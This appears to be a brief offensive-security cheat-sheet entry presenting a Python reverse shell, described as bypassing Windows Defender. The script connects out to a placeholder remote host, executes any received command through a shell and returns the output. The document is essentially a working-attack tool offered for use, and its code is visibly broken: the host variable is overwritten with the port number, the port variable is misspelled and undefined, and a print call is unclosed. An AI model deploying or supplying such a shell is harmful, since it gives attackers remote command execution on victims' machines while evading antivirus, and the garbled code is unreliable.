---
description: Bypasses windows defender
---

# Python reverse connection

```
import socket
import subprocess

REMOTE_HOST = '10.X.X.X'
REMOTE_HOST = 4231

client = socket.socket()
print ("Starting Connection..."

client.connect((REMOTE_HOST, REMOTE _PORT))
print ("Connected")

while True:
    print ("Command Awaiting")
    command = client.recv(1024)
    command = command.decode()
    
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    
    said = op.stdout.read()
    error_said = op.stderr.read()
    print("Send Response")
    client.send (said + error_said)
    
```
